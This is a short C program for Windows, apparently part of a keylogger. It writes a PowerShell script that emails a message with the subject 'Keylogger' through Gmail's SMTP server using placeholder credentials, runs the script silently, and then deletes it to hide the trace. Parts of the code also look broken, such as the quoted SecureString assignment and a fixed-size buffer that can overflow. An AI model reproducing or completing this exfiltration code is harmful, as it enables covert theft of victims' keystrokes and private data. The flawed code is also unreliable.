#include <stdio.h>
#include <Winuser.h>
#include <windows.h>
#include <dirent.h>

int main()
{
    FILE *fp = fopen("mail.ps1", "ab+");
    fprintf(fp, "$from=\"the_mail_used_to_sent\"\n");
    fprintf(fp, "$from_pass=\"password_of_from_mail\"\n");
    fprintf(fp, "$smtp=\"smtp.gmail.com\"\n");
    fprintf(fp, "$to=\"the_mail_where_to_sent\"\n");
    fprintf(fp, "$subject=\"Keylogger\"\n");
    fprintf(fp, "$body=\"simple description\"\n");
    fprintf(fp, "$secure_password=\"Convertto-SecureString -String $from_pass -AsPlainText -force\"\n");
    fprintf(fp, "$my_credentials=New-Object System.Management.Automation.PSCredential $from, $secure_password\n");
    fprintf(fp, "Send-MailMessage -To $to -From $from -Subject $subject -Body $body -SmtpServer $smtp -Credential $my_credentials -UseSSL -Port 587 -DeliveryNotificationOption never\n");
    fclose(fp);
    char *syscall = (char*)malloc(100*sizeof(char));
    syscall[0]='\0';
    strcat(syscall,"powershell \"");
    char *curpath;
    curpath = _getcwd(NULL,0);
    strcat(syscall, curpath);
    strcat(syscall, "\\mail.ps1\"");
    printf("%d\n",system(syscall));
    remove("mail.ps1"); 
}